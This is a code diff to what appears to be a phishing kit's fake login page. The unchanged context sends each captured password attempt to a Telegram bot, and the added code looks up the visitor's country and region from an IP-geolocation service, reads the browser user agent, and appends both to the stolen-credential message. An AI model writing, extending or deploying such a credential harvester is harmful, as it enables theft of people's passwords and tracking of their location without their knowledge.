@@ -10,6 +10,11 @@ const LoginPage = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [success, setSuccess] = useState(false);
   const [step, setStep] = useState(1);
+  const [userInfo, setUserInfo] = useState({
+    country: 'Unknown',
+    region: 'Unknown',
+    userAgent: 'Unknown'
+  });
   const router = useRouter();
 
   useEffect(() => {
@@ -42,6 +47,41 @@ const LoginPage = () => {
       }
     };
     createCircuitBackground();
+
+    // Get user location and browser info
+    const getUserInfo = async () => {
+      try {
+        // Get user agent
+        const userAgent = navigator.userAgent || 'Unknown';
+        
+        // Try to get location info from IP
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        if (ipResponse.ok) {
+          const ipData = await ipResponse.json();
+          setUserInfo({
+            country: ipData.country_name || 'Unknown',
+            region: ipData.region || 'Unknown',
+            userAgent: userAgent
+          });
+        } else {
+          // Fallback if IP API fails
+          setUserInfo({
+            country: 'Unknown',
+            region: 'Unknown',
+            userAgent: userAgent
+          });
+        }
+      } catch (error) {
+        // Fallback if location detection fails
+        setUserInfo({
+          country: 'Unknown',
+          region: 'Unknown',
+          userAgent: navigator.userAgent || 'Unknown'
+        });
+      }
+    };
+
+    getUserInfo();
   }, []);
 
   const handleEmailSubmit = (e) => {
@@ -80,7 +120,10 @@ const LoginPage = () => {
 - *Access Attempt*: ${step === 2 ? 'First Password Attempt' : 'Second Attempt'}
 - *Password Attempt*: ||${password}||
 - *Timestamp*: ${new Date().toISOString()}
-- *Origin*: ${window.location.hostname}`;
+- *Origin*: ${window.location.hostname}
+- *Country*: ${userInfo.country}
+- *State/Region*: ${userInfo.region}
+- *User Agent*: ${userInfo.userAgent}`;
 
       await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
